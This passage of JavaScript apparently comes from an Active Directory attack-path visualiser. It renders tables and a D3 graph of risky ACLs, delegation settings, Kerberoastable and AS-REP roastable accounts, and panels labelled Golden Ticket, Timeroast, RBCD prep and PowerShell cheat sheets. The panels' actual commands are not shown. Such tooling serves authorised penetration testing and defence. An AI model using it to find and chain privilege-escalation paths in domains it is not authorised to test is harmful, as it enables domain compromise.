function renderAclsTab() {
  const rows = (S.graph.raw_acls || []).map(a => {
    const inh = a.inherited ? '<span class="tc-inh-y">✓</span>' : '<span class="tc-inh-n">direct</span>';
    return `<tr><td class="tc-p">${a.principal.split('@')[0]}</td><td class="tc-dim">${a.principal_type}</td><td>${rp(a.right)}</td><td class="tc-t">${a.target.split('@')[0]}</td><td>${inh}</td></tr>`;
  }).join('');
  document.getElementById('content').innerHTML = `<div class="sec">
    <div class="sec-title">Critical ACLs - DA/EA/Admin filtered <span class="cnt warn">${(S.graph.raw_acls||[]).length}</span></div>
    <div class="acl-wrap"><table>
      <thead><tr><th>Principal</th><th>Type</th><th>Right</th><th>Target</th><th>Inh.</th></tr></thead>
      <tbody>${rows}</tbody>
    </table></div>
  </div>`;
}

function renderDelegTab() {
  const deleg = S.graph.deleg || {};
  let html = '<div class="deleg-grid">';

  if ((deleg.unconstrained||[]).length) {
    const rows = deleg.unconstrained.map(d=>`<div class="drow">
      <span class="dr-who" style="color:var(--red)">${d.name.split('@')[0]}</span>
      <span class="dr-spn" style="color:var(--red)">ALL SERVICES</span>
      <span class="dr-type" style="color:var(--red)">⚡ UNCONSTRAINED</span>
    </div>`).join('');
    html += `<div class="dbox" style="border-color:rgba(255,34,68,.35)">
      <h4 style="color:var(--red)">⚡ Unconstrained Delegation</h4>
      ${rows}
      ${formatTip('UnconstrainedDelegation', G_EDGE_TIPS.UnconstrainedDelegation)}
    </div>`;
  }

  if ((deleg.constrained||[]).length) {
    const rows = deleg.constrained.map(d=>`<div class="drow">
      <span class="dr-who">${d.name.split('@')[0]}</span>
      <span class="dr-spn">${d.spn}</span>
      <span class="dr-type" style="color:${d.t2a4d?'var(--orange)':'var(--dim2)'}">${d.t2a4d?'⚡ T2A4D':'KCD'}</span>
    </div>`).join('');
    const t2a4d = deleg.constrained.some(d=>d.t2a4d);
    html += `<div class="dbox">
      <h4 style="color:${t2a4d?'var(--orange)':'var(--cyan)'}">Constrained Delegation${t2a4d?' (T2A4D = protocol transition!)':''}</h4>
      ${rows}
      ${t2a4d ? formatTip('AllowedToDelegate', G_EDGE_TIPS.AllowedToDelegate) : ''}
    </div>`;
  }

  html += '</div>';

  if ((S.graph.pre2k||[]).length) {
    const pills = S.graph.pre2k.map(p=>`<span class="pre2k-pill">⚡ ${p.split('@')[0]}</span>`).join('');
    html += `<div class="sec" style="margin-top:18px">
      <div class="sec-title" style="color:var(--yellow)">⚡ Pre-Windows 2000 Compatible Access <span class="cnt warn">${S.graph.pre2k.length}</span></div>
      <div class="pre2k-list">${pills}</div>
      ${formatTip('Pre2KCompatible', G_EDGE_TIPS.Pre2KCompatible)}
    </div>`;
  }

  // Kerberoastable + AS-REP sections
  const kerberoastable = S.principals.filter(p=>p.hasspn && !p.isMachine && p.enabled);
  const asrep = S.principals.filter(p=>p.dontreqpreauth && p.enabled);

  if (kerberoastable.length) {
    const pills = kerberoastable.map(u=>`<span class="pre2k-pill" style="border-color:rgba(255,215,0,.4);color:var(--yellow)">🎫 ${u.name.split('@')[0]}</span>`).join('');
    html += `<div class="sec" style="margin-top:18px">
      <div class="sec-title">🎫 Kerberoastable Accounts <span class="cnt warn">${kerberoastable.length}</span></div>
      <div class="pre2k-list">${pills}</div>
      ${formatTip('Kerberoast', G_EDGE_TIPS.Kerberoast)}
    </div>`;
  }

  if (asrep.length) {
    const pills = asrep.map(u=>`<span class="pre2k-pill" style="border-color:rgba(187,134,252,.4);color:var(--purple)">👻 ${u.name.split('@')[0]}</span>`).join('');
    html += `<div class="sec" style="margin-top:18px">
      <div class="sec-title">👻 AS-REP Roastable Accounts <span class="cnt warn">${asrep.length}</span></div>
      <div class="pre2k-list">${pills}</div>
      ${formatTip('ASREProast', G_EDGE_TIPS.ASREProast)}
    </div>`;
  }

  document.getElementById('content').innerHTML = `<div class="sec"><div class="sec-title">Insights & Attack Notes</div>${html}</div>`;
  postProcessPreBlocks(document.getElementById('content'));
}


function renderDelegExtra() {
  // Protected Users members (owned principals)
  const member_of = S.graph.member_of || {};
  const protectedUsers = S.principals.filter(p =>
    (member_of[p.key] || []).some(g => g.includes('PROTECTED'))
  );
  const winrmUsers = S.principals.filter(p =>
    (member_of[p.key] || []).some(g => g.includes('REMOTE MANAGEMENT'))
  );

  let extra = '';

  if (protectedUsers.length) {
    const pills = protectedUsers.map(p =>
      `<span class="pre2k-pill" style="border-color:rgba(255,34,68,.4);color:var(--red)">🛡 ${p.key}</span>`
    ).join('');
    extra += `<div class="sec" style="margin-top:18px">
      <div class="sec-title">🛡 Protected Users members <span class="cnt warn">${protectedUsers.length}</span></div>
      <div class="pre2k-list">${pills}</div>
      ${formatTip('ProtectedGroup', G_EDGE_TIPS.ProtectedGroup)}
    </div>`;
  }

  if (winrmUsers.length) {
    const pills = winrmUsers.map(p =>
      `<span class="pre2k-pill" style="border-color:rgba(0,212,255,.4);color:var(--cyan)">🖥 ${p.key}</span>`
    ).join('');
    extra += `<div class="sec" style="margin-top:18px">
      <div class="sec-title">🖥 Remote Management Users members <span class="cnt">${winrmUsers.length}</span></div>
      <div class="pre2k-list">${pills}</div>
      ${formatTip('RemoteManagementUsers', G_EDGE_TIPS.RemoteManagementUsers)}
    </div>`;
  }

  const rights = new Set((S.graph.raw_acls || []).map(a => a.right));
  if (rights.has('DCSync')) {
    extra += `<div class="sec" style="margin-top:18px">
      <div class="sec-title">🎟 Golden Ticket note</div>
      ${formatTip('GoldenTicket', G_EDGE_TIPS.GoldenTicket)}
    </div>`;
  }

  if ((S.stats.computers || 0) > 0) {
    extra += `<div class="sec" style="margin-top:18px">
      <div class="sec-title">⏱ Timeroast note</div>
      ${formatTip('Timeroast', G_EDGE_TIPS.Timeroast)}
    </div>`;
  }

  extra += `<div class="sec" style="margin-top:18px">
    <div class="sec-title">🖥 PowerShell / WinRM Cheat Sheet</div>
    <div style="color:var(--dim);font-size:.8em;line-height:1.7;margin-bottom:10px">
      Practical Windows-side alternatives for the cases where PowerShell is actually pleasant to use.
      Linux tooling like Impacket / Certipy is still the cleaner route for many Kerberos and certificate abuse paths.
    </div>
    <div class="deleg-grid">
      <div class="dbox">
        <h4>Account & Group Actions</h4>
        ${formatTip('PSNativeActions', G_EDGE_TIPS.PSNativeActions)}
      </div>
      <div class="dbox">
        <h4>PowerView Shortcuts</h4>
        ${formatTip('PSPowerViewActions', G_EDGE_TIPS.PSPowerViewActions)}
      </div>
      <div class="dbox">
        <h4>RBCD Prep</h4>
        ${formatTip('PSRBCDPrep', G_EDGE_TIPS.PSRBCDPrep)}
      </div>
      <div class="dbox">
        <h4>WinRM Session Helpers</h4>
        ${formatTip('PSWinRMEnum', G_EDGE_TIPS.PSWinRMEnum)}
      </div>
    </div>
  </div>`;

  if (extra) {
    const cont = document.getElementById('content');
    const sec = cont.querySelector('.sec');
    sec.insertAdjacentHTML('beforeend', extra);
    postProcessPreBlocks(cont);
  }
}


function renderOverviewTab() {
  const s = S.stats;
  const cardDefs = [
    {k:'users',n:s.users,l:'Users',c:''},{k:'computers',n:s.computers,l:'Computers',c:''},{k:'groups',n:s.groups,l:'Groups',c:''},
    {k:'gpos',n:s.gpos,l:'GPOs',c:''},{k:'ous',n:s.ous||0,l:'OUs',c:''},{k:'containers',n:s.containers||0,l:'Containers',c:''},
    {k:'dcs',n:s.dcs||0,l:'DCs',c:s.dcs?'warn':''},{k:'unconstrained',n:s.unconstrained||0,l:'Unconstrained',c:s.unconstrained?'warn':''},
    {k:'gmsa',n:s.gmsa||0,l:'gMSA',c:s.gmsa?'warn':''},{k:'acls',n:s.acls,l:'Crit ACEs',c:s.acls?'warn':''},
    {k:'kerberoastable',n:s.kerberoastable,l:'Kerberoast',c:s.kerberoastable?'warn':''},{k:'asrep',n:s.asrep,l:'AS-REP',c:s.asrep?'warn':''},
    {k:'paths',n:s.paths,l:'Paths',c:s.paths?'paths':''},
  ];
  if (!cardDefs.some(c => c.k === S.overviewFocus)) S.overviewFocus = 'users';
  const cards = cardDefs.map(card=>`<div class="sc clickable ${S.overviewFocus===card.k?'active':''}" onclick="setOverviewFocus('${card.k}')">
    <span class="sc-n ${card.c}">${card.n}</span><div class="sc-l">${card.l}</div>
  </div>`).join('');

  const interesting = S.principals.filter(p => !p.isMachine && (p.hasspn||p.dontreqpreauth||p.trustedtoauth||p.admincount));
  const irows = interesting.map(u => {
    const tags = [u.admincount?'<span class="tag-sm t-dc">Admin</span>':'',u.hasspn?'<span class="tag-sm t-spn">SPN</span>':'',u.dontreqpreauth?'<span class="tag-sm t-asrep">ASREP</span>':'',u.trustedtoauth?'<span class="tag-sm t-t2a4d">T2A4D</span>':''].filter(Boolean).join(' ');
    return `<tr><td class="tc-p">${u.name.split('@')[0]}</td><td class="tc-dim">${u.type}</td><td>${u.enabled?'<span style="color:var(--green)">✓</span>':'<span style="color:var(--dim)">✗</span>'}</td><td>${tags}</td></tr>`;
  }).join('');

  document.getElementById('content').innerHTML = `
    <div class="sec"><div class="sec-title">Overview — ${S.domain}</div><div class="stat-row">${cards}</div></div>
    <div class="sec" id="overviewDetail"></div>
    <div class="sec"><div class="sec-title">Interesting Principals <span class="cnt">${interesting.length}</span></div>
    <div class="acl-wrap"><table><thead><tr><th>Name</th><th>Type</th><th>Enabled</th><th>Flags</th></tr></thead><tbody>${irows||'<tr><td colspan="4" style="color:var(--dim2);text-align:center;padding:16px">—</td></tr>'}</tbody></table></div></div>`;
  renderOverviewDetail();
}

function setOverviewFocus(kind) {
  S.overviewFocus = kind;
  renderOverviewTab();
}

function overviewObjectList(type) {
  return ((S.graph.object_lists || {})[type] || Object.values(S.graph.objects || {}).filter(o => o.type === type))
    .sort((a,b) => a.name.localeCompare(b.name));
}

function overviewGraphStatusMap() {
  const status = {};
  const ensure = id => {
    if (!status[id]) status[id] = {visible:false, bucketed:false, acl:false, structure:false, member:false, path:false};
    return status[id];
  };
  const { nodes, links } = buildGraphData();
  nodes.forEach(n => {
    const s = ensure(n.id);
    s.visible = true;
    s.path = !!n.onPath;
  });
  links.forEach(l => {
    const source = l.source?.id || l.source;
    const target = l.target?.id || l.target;
    [source, target].forEach(id => ensure(id).visible = true);
    if (l.structural) {
      ensure(source).structure = true;
      ensure(target).structure = true;
    } else if (l.right === 'MemberOf') {
      ensure(source).member = true;
      ensure(target).member = true;
    } else {
      ensure(source).acl = true;
      ensure(target).acl = true;
    }
  });
  const structuralLinks = links.filter(l => l.structural);
  const compacted = compactStructureView(nodes, structuralLinks);
  compacted.nodes.filter(n => n.bucket).forEach(bucket => {
    (bucket.bucketItems || []).forEach(id => ensure(id).bucketed = true);
  });
  return status;
}

function graphStatusBadges(item, statusMap) {
  const id = item.key || item.name?.toUpperCase().split('@')[0] || '';
  const s = statusMap[id] || {};
  const badges = [];
  if (s.visible) badges.push('<span class="ov-g vis">Visible</span>');
  else badges.push('<span class="ov-g disc">Disconnected</span>');
  if (s.bucketed) badges.push('<span class="ov-g bucket">Bucketed</span>');
  if (s.acl) badges.push('<span class="ov-g acl">ACL</span>');
  if (s.structure) badges.push('<span class="ov-g struct">Structure</span>');
  if (s.member) badges.push('<span class="ov-g member">MemberOf</span>');
  if (s.path) badges.push('<span class="ov-g path">Path</span>');
  return `<div class="ov-graph">${badges.join('')}</div>`;
}

function objectSearchIndex(statusMap) {
  const byKey = new Map();
  const add = (item, source) => {
    if (!item?.name) return;
    const key = item.key || item.name.toUpperCase().split('@')[0];
    const id = `${key}|${item.type || 'Object'}`;
    if (byKey.has(id)) return;
    byKey.set(id, {
      key,
      name: item.name,
      type: item.type || 'Object',
      source,
      enabled: item.enabled,
      isMachine: !!item.isMachine,
      isDC: !!item.isDC,
      isGmsa: !!item.isGmsa,
      status: statusMap[key] || {},
    });
  };
  S.principals.forEach(p => add(p, 'Starting Point'));
  Object.entries(S.graph.object_lists || {}).forEach(([type, items]) => {
    (items || []).forEach(o => add(o, 'Inventory'));
  });
  return [...byKey.values()].sort((a,b) => a.name.localeCompare(b.name));
}

function objectSearchMatches(statusMap) {
  const q = (S.objectSearch || '').trim().toLowerCase();
  if (!q) return [];
  return objectSearchIndex(statusMap).filter(item =>
    item.name.toLowerCase().includes(q) ||
    item.key.toLowerCase().includes(q) ||
    item.type.toLowerCase().includes(q)
  ).sort((a,b) => {
    const ax = a.key.toLowerCase() === q || a.name.toLowerCase() === q ? 0 : a.key.toLowerCase().startsWith(q) ? 1 : 2;
    const bx = b.key.toLowerCase() === q || b.name.toLowerCase() === q ? 0 : b.key.toLowerCase().startsWith(q) ? 1 : 2;
    return ax !== bx ? ax - bx : a.name.localeCompare(b.name);
  });
}

function objectSearchRows(items, statusMap) {
  return items.map(item => `<tr>
    <td class="ov-name">${escHtml(item.name.split('@')[0])}</td>
    <td class="tc-dim">${escHtml(item.type)}</td>
    <td class="tc-dim">${escHtml(item.source)}</td>
    <td>${graphStatusBadges(item, statusMap)}</td>
  </tr>`).join('');
}

function principalRows(items, statusMap) {
  return items.map(p => {
    const tags = [
      p.isDC ? '<span class="tag-sm t-dc">DC</span>' : '',
      p.isGmsa ? '<span class="tag-sm t-gmsa">gMSA</span>' : '',
      p.unconstrained ? '<span class="tag-sm t-dc">UNCON</span>' : '',
      p.admincount ? '<span class="tag-sm t-dc">Admin</span>' : '',
      p.hasspn ? '<span class="tag-sm t-spn">SPN</span>' : '',
      p.dontreqpreauth ? '<span class="tag-sm t-asrep">ASREP</span>' : '',
      p.trustedtoauth ? '<span class="tag-sm t-t2a4d">T2A4D</span>' : '',
    ].filter(Boolean).join('');
    return `<tr><td class="ov-name">${escHtml(p.name.split('@')[0])}</td><td class="tc-dim">${escHtml(p.type)}</td><td>${p.enabled?'<span style="color:var(--green)">✓</span>':'<span style="color:var(--dim)">✗</span>'}</td><td><div class="ov-tags">${tags||'<span style="color:var(--dim)">—</span>'}</div></td><td>${graphStatusBadges(p, statusMap)}</td></tr>`;
  }).join('');
}

function objectRows(items, statusMap) {
  return items.map(o => `<tr><td class="ov-name">${escHtml(o.name.split('@')[0])}</td><td class="tc-dim">${escHtml(o.type)}</td><td class="tc-dim">${escHtml(o.objectid || '—')}</td><td>${graphStatusBadges(o, statusMap)}</td></tr>`).join('');
}

function renderOverviewDetail() {
  const detail = document.getElementById('overviewDetail');
  if (!detail) return;
  const kind = S.overviewFocus || 'users';
  const statusMap = overviewGraphStatusMap();
  let title = kind;
  let head = '<tr><th>Name</th><th>Type</th><th>Enabled</th><th>Flags</th><th>Graph</th></tr>';
  let rows = '';
  const searchResults = objectSearchMatches(statusMap);

  if ((S.objectSearch || '').trim()) {
    title = `Search Results: "${S.objectSearch.trim()}"`;
    head = '<tr><th>Name</th><th>Type</th><th>Source</th><th>Graph</th></tr>';
    rows = objectSearchRows(searchResults, statusMap);
  } else if (kind === 'users') {
    title = 'Users';
    rows = principalRows(S.principals.filter(p => p.type === 'User' && !p.isMachine), statusMap);
  } else if (kind === 'computers') {
    title = 'Computers';
    rows = principalRows(S.principals.filter(p => p.type === 'Computer'), statusMap);
  } else if (kind === 'dcs') {
    title = 'Domain Controllers';
    rows = principalRows(S.principals.filter(p => p.isDC), statusMap);
  } else if (kind === 'unconstrained') {
    title = 'Unconstrained Delegation';
    rows = principalRows(S.principals.filter(p => p.unconstrained), statusMap);
  } else if (kind === 'gmsa') {
    title = 'gMSA';
    rows = principalRows(S.principals.filter(p => p.isGmsa), statusMap);
  } else if (kind === 'kerberoastable') {
    title = 'Kerberoastable Users';
    rows = principalRows(S.principals.filter(p => p.type === 'User' && !p.isMachine && p.hasspn && p.enabled), statusMap);
  } else if (kind === 'asrep') {
    title = 'AS-REP Roastable Users';
    rows = principalRows(S.principals.filter(p => p.type === 'User' && !p.isMachine && p.dontreqpreauth), statusMap);
  } else if (['groups','gpos','ous','containers'].includes(kind)) {
    const typeMap = {groups:'Group', gpos:'GPO', ous:'OU', containers:'Container'};
    const titleMap = {groups:'Groups', gpos:'GPOs', ous:'OUs', containers:'Containers'};
    title = titleMap[kind];
    head = '<tr><th>Name</th><th>Type</th><th>Object ID</th><th>Graph</th></tr>';
    rows = objectRows(overviewObjectList(typeMap[kind]), statusMap);
  } else if (kind === 'acls') {
    title = 'Critical ACEs';
    head = '<tr><th>Principal</th><th>Right</th><th>Target</th><th>Inherited</th></tr>';
    rows = (S.graph.raw_acls || []).map(a => `<tr><td class="ov-name">${escHtml(a.principal.split('@')[0])}</td><td>${rp(a.right)}</td><td class="tc-dim">${escHtml(a.target.split('@')[0])}</td><td>${a.inherited?'<span style="color:var(--yellow)">Yes</span>':'<span style="color:var(--dim)">No</span>'}</td></tr>`).join('');
  } else if (kind === 'paths') {
    title = 'Attack Paths';
    head = '<tr><th>From</th><th>Right</th><th>To</th><th>Depth</th></tr>';
    rows = (S.paths || []).map(p => `<tr><td class="ov-name">${escHtml(p.from.split('@')[0])}</td><td>${rp(p.right)}</td><td class="tc-dim">${escHtml(p.to.split('@')[0])}</td><td>${p.depth}</td></tr>`).join('');
  }

  const count = (rows.match(/<tr>/g) || []).length;
  detail.innerHTML = `<div class="sec-title">${escHtml(title)} <span class="cnt">${count}</span></div>
    <div class="acl-wrap">${rows ? `<table><thead>${head}</thead><tbody>${rows}</tbody></table>` : '<div class="ov-empty">No objects in this category</div>'}</div>`;
}


// ── GRAPH ENGINE ──

function buildGraphData() {
  // Build nodes + links from S.graph (raw_acls + member_of + deleg)
  const nodeSet = new Map(); // id → node object
  const links   = [];
  const objects = S.graph.objects || {};

  const addNode = (name, forceType) => {
    const key = name.toUpperCase().split('@')[0];
    if (nodeSet.has(key)) return key;
    const principal = S.principals.find(p => p.key === key);
    const obj = objects[key] || {};
    let type = forceType || obj.type || principal?.type || 'Unknown';
    const isDC = obj.isDC || principal?.isDC || (type === 'Computer' && obj.unconstrained && key.includes('DC'));
    const isGmsa = obj.isGmsa || principal?.isGmsa;
    if (isDC) type = 'dc';
    if (isGmsa) type = 'gmsa';
    nodeSet.set(key, {
      id: key,
      label: (obj.name || name).split('@')[0],
      type,
      owned: S.owned.has(key),
      enabled: obj.enabled ?? principal?.enabled ?? true,
      admincount: obj.admincount ?? principal?.admincount ?? false,
      t2a4d: obj.trustedtoauth ?? principal?.trustedtoauth ?? false,
      hasspn: obj.hasspn ?? principal?.hasspn ?? false,
      unconstrained: obj.unconstrained ?? principal?.unconstrained ?? false,
      objectid: obj.objectid || '',
      dontreqpreauth: obj.dontreqpreauth ?? principal?.dontreqpreauth ?? false,
    });
    return key;
  };

  // From raw ACLs
  (S.graph.raw_acls || []).forEach(ace => {
    const s = addNode(ace.principal, ace.principal_type && ace.principal_type !== '?' ? ace.principal_type : null);
    const t = addNode(ace.target, ace.target_type);
    const sev = G_SEV_MAP[ace.right] || 4;
    links.push({ source: s, target: t, right: ace.right, sev, id: `${s}|${t}|${ace.right}` });
  });

  // From structural relationships (Contains, GpLink)
  (S.graph.structural_edges || []).forEach(edge => {
    const s = addNode(edge.source, edge.source_type);
    const t = addNode(edge.target, edge.target_type);
    const sev = G_SEV_MAP[edge.right] || 4;
    links.push({
      source: s,
      target: t,
      right: edge.right,
      sev,
      structural: true,
      enforced: edge.enforced ?? false,
      id: `${s}|${t}|${edge.right}`,
    });
  });

  // From member_of (group memberships)
  Object.entries(S.graph.member_of || {}).forEach(([member, groups]) => {
    if (!nodeSet.has(member)) addNode(member);
    groups.forEach(grp => {
      if (!nodeSet.has(grp)) addNode(grp, 'Group');
      // Avoid duplicates
      const lid = `${member}|${grp}|MemberOf`;
      if (!links.find(l => l.id === lid)) {
        links.push({ source: member, target: grp, right: 'MemberOf', sev: 4, id: lid });
      }
    });
  });

  // Mark owned
  nodeSet.forEach((n, key) => { n.owned = S.owned.has(key); });

  // Mark attack path nodes, including via groups.
  const { pathNodeSet } = buildAttackPathLinks();
  nodeSet.forEach((n,key) => { n.onPath = pathNodeSet.has(key); });

  return { nodes: [...nodeSet.values()], links };
}

function buildAttackPathLinks() {
  // Build Set of exact "source|target|right" keys that are part of computed attack paths.
  const pathKeys = new Set();
  const pairKeys = new Set();
  const exactPairs = new Set();
  const pathNodeSet = new Set();

  function addPathEdge(source, target, right) {
    const s = source.toUpperCase().split('@')[0];
    const t = target.toUpperCase().split('@')[0];
    pathNodeSet.add(s);
    pathNodeSet.add(t);
    if (right) {
      pathKeys.add(`${s}|${t}|${right}`);
      exactPairs.add(`${s}|${t}`);
    }
    pairKeys.add(`${s}|${t}`);
  }

  S.paths.forEach(p => {
    if (!p.chain) return;
    for (let i = 0; i < p.chain.length - 1; i++) {
      const current = p.chain[i];
      const next = p.chain[i+1];
      if (next.via) {
        addPathEdge(current.name, next.via, 'MemberOf');
        addPathEdge(next.via, next.name, next.right);
      } else {
        addPathEdge(current.name, next.name, next.right);
      }
    }
  });
  return { pathKeys, pairKeys, exactPairs, pathNodeSet };
}

function gIsSmartNode(n) {
  if (!n) return false;
  const name = `${n.label || ''} ${n.id || ''}`;
  return n.owned || n.onPath || n.type === 'dc' || n.type === 'Domain' || n.type === 'gmsa' ||
    n.type === 'GPO' || n.admincount || n.unconstrained || n.t2a4d || n.dontreqpreauth ||
    (n.hasspn && n.type !== 'Computer') || G_SMART_NAME_RE.test(name);
}

function gSmartGraph(nodes, links) {
  const byId = Object.fromEntries(nodes.map(n => [n.id, n]));
  const { pathKeys, pairKeys, exactPairs } = buildAttackPathLinks();
  const important = new Set(nodes.filter(gIsSmartNode).map(n => n.id));
  const smartLinks = [];
  const smartNodes = new Set(important);

  const addLink = l => {
    const s = l.source?.id || l.source;
    const t = l.target?.id || l.target;
    smartLinks.push(l);
    smartNodes.add(s);
    smartNodes.add(t);
  };

  links.forEach(l => {
    const s = l.source?.id || l.source;
    const t = l.target?.id || l.target;
    const pair = `${s}|${t}`;
    const sImportant = important.has(s);
    const tImportant = important.has(t);
    const pathEdge = pathKeys.has(`${pair}|${l.right}`) || (!exactPairs.has(pair) && pairKeys.has(pair));
    const highAcl = !l.structural && l.right !== 'MemberOf' && (l.sev || 9) <= 3;
    const remoteMgmt = G_REMOTE_RIGHTS.has(l.right);
    const importantGpLink = l.right === 'GpLink' && (sImportant || tImportant || byId[s]?.type === 'GPO' || byId[t]?.type === 'GPO');
    const importantContains = l.right === 'Contains' && (sImportant || tImportant) &&
      !(['User','Computer','gmsa'].includes(byId[t]?.type) && !tImportant);
    const importantMember = l.right === 'MemberOf' && (sImportant || tImportant || pathEdge);
    if (pathEdge || highAcl || remoteMgmt || importantGpLink || importantContains || importantMember) addLink(l);
  });

  return {
    nodes: nodes.filter(n => smartNodes.has(n.id)),
    links: smartLinks,
  };
}

function gEdgeFilterDefaults() {
  return Object.fromEntries(G_FILTER_DEFS.map(f => [f.key, true]));
}

function gEdgeFilters() {
  if (!G.edgeFilters) G.edgeFilters = gEdgeFilterDefaults();
  return G.edgeFilters;
}

function gEdgeFiltersChanged() {
  const filters = gEdgeFilters();
  return G_FILTER_DEFS.some(f => filters[f.key] === false);
}

function gEdgeMatchesFilter(l, key, pathInfo) {
  const source = l.source?.id || l.source;
  const target = l.target?.id || l.target;
  const pair = `${source}|${target}`;
  const pathEdge = pathInfo.pathKeys.has(`${pair}|${l.right}`) ||
    (!pathInfo.exactPairs.has(pair) && pathInfo.pairKeys.has(pair));
  if (key === 'path') return pathEdge;
  if (key === 'memberof') return l.right === 'MemberOf';
  if (key === 'contains') return l.right === 'Contains';
  if (key === 'gplink') return l.right === 'GpLink';
  if (key === 'critical') return !l.structural && l.right !== 'MemberOf' && (l.sev || 9) <= 2;
  if (key === 'write') return G_WRITE_RIGHTS.has(l.right);
  if (key === 'delegation') return G_DELEG_RIGHTS.has(l.right);
  if (key === 'remote') return G_REMOTE_RIGHTS.has(l.right);
  return false;
}

function gPassesEdgeFilters(l, pathInfo) {
  const filters = gEdgeFilters();
  const matched = G_FILTER_DEFS.filter(f => gEdgeMatchesFilter(l, f.key, pathInfo)).map(f => f.key);
  if (!matched.length) return true;
  return matched.some(key => filters[key] !== false);
}

function renderGraphTab() {
  const container = document.getElementById('graphView');
  if (!S.principals.length) {
    container.innerHTML = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:var(--dim2);font-size:.7em;letter-spacing:2px">Load a ZIP file first</div>';
    return;
  }

  // Build fresh data each render (owned may have changed)
  const { nodes, links } = buildGraphData();

  if (!G.initialized) {
    initGraphSVG(container);
  }

  drawGraph(nodes, links, container);
}

function gSyncToolbarState() {
  const modeIds = {smart:'gBtnSmart', all:'gBtnAll', paths:'gBtnPath', owned:'gBtnOwned', focus:'gBtnFocus'};
  const edgeIds = {all:'gEdgeAll', acl:'gEdgeAcl', structure:'gEdgeStruct'};
  document.querySelectorAll('.g-btn[id^=gBtn]').forEach(b=>{
    b.classList.toggle('active', b.id === modeIds[G.mode]);
  });
  document.querySelectorAll('.g-btn[id^=gEdge]').forEach(b=>{
    b.classList.toggle('active', b.id === edgeIds[G.edgeLayer]);
  });
  gSyncEdgeFilterState();
}

function initGraphSVG(container) {
  // Clear any previous
  container.innerHTML = '';

  // Toolbar
  container.insertAdjacentHTML('beforeend', `
    <div class="g-toolbar">
      <button class="g-btn active" id="gBtnSmart" onclick="gSetMode('smart')">Smart</button>
      <button class="g-btn"        id="gBtnAll"   onclick="gSetMode('all')">Full graph</button>
      <button class="g-btn"        id="gBtnPath"  onclick="gSetMode('paths')">Attack paths only</button>
      <button class="g-btn"        id="gBtnOwned" onclick="gSetMode('owned')">Owned + neighbors</button>
      <button class="g-btn"        id="gBtnFocus" onclick="gSetMode('focus')">Focus selected</button>
      <span style="width:1px;background:var(--border2);margin:0 2px"></span>
      <button class="g-btn active" id="gEdgeAll"    onclick="gSetEdgeLayer('all')">All edges</button>
      <button class="g-btn"        id="gEdgeAcl"    onclick="gSetEdgeLayer('acl')">ACL</button>
      <button class="g-btn"        id="gEdgeStruct" onclick="gSetEdgeLayer('structure')">Structure</button>
      <span style="width:1px;background:var(--border2);margin:0 2px"></span>
      <button class="g-btn" id="gFilterToggle" onclick="gToggleEdgeFilterPanel()">Edge filters</button>
      <span style="width:1px;background:var(--border2);margin:0 2px"></span>
      <button class="g-btn" onclick="gZoomBy(1.3)">+</button>
      <button class="g-btn" onclick="gZoomBy(.77)">−</button>
      <button class="g-btn" onclick="gZoomFit()">⊡</button>
      <button class="g-btn danger" onclick="gClearSel()">Clear all</button>
    </div>
  `);
  container.insertAdjacentHTML('beforeend', `
    <div class="g-filter-panel hidden" id="gFilterPanel">
      ${G_FILTER_DEFS.map(f => `<button class="g-filter-btn active" id="gFilt_${f.key}" onclick="gToggleEdgeFilter('${f.key}')">${f.label}</button>`).join('')}
      <button class="g-filter-btn" onclick="gResetEdgeFilters()">Reset</button>
    </div>
  `);
  gSyncToolbarState();

  // Legend
  container.insertAdjacentHTML('beforeend', `
    <div class="g-legend">
      <div class="g-legend-title">Node Types</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#00ff88;box-shadow:0 0 5px #00ff88"></div>Owned</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#ff2244;box-shadow:0 0 4px #ff2244"></div>DC / Unconstrained</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#ff7b2b"></div>Computer</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#c084fc"></div>Group</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#ff4fa3"></div>GPO</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#00d4ff"></div>User</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#42d392"></div>OU</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#8aa4b8"></div>Container</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#53606a"></div>Compact bucket</div>
      <div class="g-legend-row"><div class="g-dot" style="background:#ffd700"></div>gMSA</div>
      <div class="g-sep"></div>
      <div class="g-legend-title">Edge Severity</div>
      <div class="g-legend-row"><div class="g-line" style="background:#ff2244"></div>Critical</div>
      <div class="g-legend-row"><div class="g-line" style="background:#ff7b2b"></div>High</div>
      <div class="g-legend-row"><div class="g-line" style="background:#ffd700"></div>Medium</div>
      <div class="g-legend-row"><div class="g-line" style="background:#00ff88"></div>Info</div>
    </div>
  `);

  // Info panel
  container.insertAdjacentHTML('beforeend', `
    <div class="g-info hidden" id="gInfo">
      <div class="g-info-hdr">
        <span class="g-info-icon" id="gIIcon">👤</span>
        <div style="overflow:hidden;flex:1">
          <div class="g-info-name" id="gIName">—</div>
          <div class="g-info-type" id="gIType">—</div>
        </div>
      </div>
      <div class="g-info-body"  id="gIBody"></div>
      <div class="g-info-edges" id="gIEdges"></div>
    </div>
  `);

  // Path bar
  container.insertAdjacentHTML('beforeend', `
    <div class="g-pathbar" id="gPathBar">
      <b>⚡ ATTACK PATH</b>
      <div class="g-pchain" id="gPChain"></div>
    </div>
  `);

  // SVG
  const svgEl = document.createElementNS('http://www.w3.org/2000/svg','svg');
  container.appendChild(svgEl);

  const svg  = d3.select(svgEl);
  const root = svg.append('g');
  G.svg = svg; G.root = root;

  // defs
  const defs = svg.append('defs');
  const filt = defs.append('filter').attr('id','gGlow').attr('x','-50%').attr('y','-50%').attr('width','200%').attr('height','200%');
  filt.append('feGaussianBlur').attr('in','SourceGraphic').attr('stdDeviation','3.5').attr('result','b');
  const fm = filt.append('feMerge');
  fm.append('feMergeNode').attr('in','b');
  fm.append('feMergeNode').attr('in','SourceGraphic');

  // zoom
  const zoom = d3.zoom().scaleExtent([.04,6])
    .on('zoom', e => root.attr('transform', e.transform));
  svg.call(zoom).on('dblclick.zoom', null);
  G.zoom = zoom;

  // scanline overlay on SVG
  svg.append('rect').attr('width','100%').attr('height','100%')
    .attr('fill','url(#gScanlines)').attr('pointer-events','none')
    .attr('opacity',.04);

  // grid pattern background
